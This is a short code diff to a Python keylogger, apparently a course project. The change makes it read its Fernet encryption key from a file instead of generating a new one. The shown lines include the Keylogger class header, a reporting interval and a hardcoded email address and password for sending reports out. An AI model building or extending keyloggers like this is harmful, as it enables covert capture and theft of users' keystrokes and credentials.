@@ -12,10 +12,9 @@ from cryptography.fernet import Fernet
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "cs455group3@outlook.com"
 EMAIL_PASSWORD = "group3cs455"
-KEY = Fernet.generate_key()
 
-with open('key.txt', 'wb') as f:
-    f.write(KEY)
+with open('key.txt', 'rb') as f:
+    KEY = f.read()
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
